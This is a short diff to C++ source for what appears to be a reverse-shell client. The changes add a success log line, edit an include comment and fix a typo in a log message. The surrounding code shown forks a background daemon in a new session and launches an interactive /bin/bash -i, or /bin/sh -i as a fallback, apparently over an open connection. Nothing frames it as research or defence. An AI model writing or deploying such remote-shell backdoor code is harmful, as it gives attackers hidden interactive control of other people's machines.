@@ -1,6 +1,6 @@
 #include <string>
 #include <stdexcept> // std::invalid_argument
-#include <unistd.h> // fork, setsid, dup2, execl, access, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO
+#include <unistd.h> // fork, setsid, dup2, execl, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO, close
 #include <string.h> // strlen
 #include "client.h"
 #include "log.h"
@@ -33,6 +33,8 @@ int Client::start() {
 		return -1;
 	}
 
+	Log::success("Connection was successful!");
+
 	pid_t childPid = fork();
 	if (childPid == 0) {
 		// Run the new process in the background as a daemon and add it in a new
@@ -53,7 +55,7 @@ int Client::start() {
 			Log::error("execl failed (/bin/bash)");
 		}
 
-		Log::info("Couln't run /bin/bash. Trying /bin/sh...");
+		Log::info("Couldn't run /bin/bash. Trying /bin/sh...");
 
 		// /bin/sh
 		if (execl("/bin/sh", "/bin/sh", "-i", NULL) == -1) {
